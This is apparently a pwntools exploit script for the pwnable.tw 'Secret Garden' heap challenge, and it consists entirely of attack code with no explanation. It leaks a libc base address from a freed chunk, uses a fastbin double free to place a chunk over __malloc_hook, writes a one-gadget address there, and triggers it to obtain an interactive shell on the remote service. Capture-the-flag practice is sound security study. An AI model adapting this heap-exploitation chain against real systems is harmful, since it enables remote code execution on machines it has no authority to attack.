from pwn import *
def cmd(c):
	p.sendlineafter("choice : ",str(c))
def add(name="XXXX",l=0x80,c="AAAA"):
	cmd(1)
	p.sendlineafter("name :",str(l))
	p.sendafter("flower :",name)
	p.sendlineafter("flower :",c)
def show():
	cmd(2)
def free(idx):
	cmd(3)
	p.sendlineafter("garden:",str(idx))
def clear():
	cmd(4)
#p=process("secretgarden",env={"LD_PRELOAD":"./libc_64.so.6"})
p=remote("chall.pwnable.tw",10203)
context.arch='amd64'
add()#0
add()#1
free(0)
clear()
add("A")
#context.log_level='debug'
show()
p.readuntil("Name of the flower[0] :")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b41-0x7ffff7a0d000)+0x1000
#libc=ELF("./secretgarden").libc
libc=ELF("./libc_64.so.6")
libc.address=base
log.warning(hex(base))

add("nier",0x68)#2
add("nier",0x68)#3
add()
free(2)
free(3)
free(2)
clear()
add(p64(libc.symbols['__malloc_hook']-35),0x68)#2
add("\n",0x68)#3
add("\n",0x68)#2
add("\x00"*19+p64(0xef6c4+base),0x68)#2
free(2)
free(2)
#gdb.attach(p)
p.interactive()
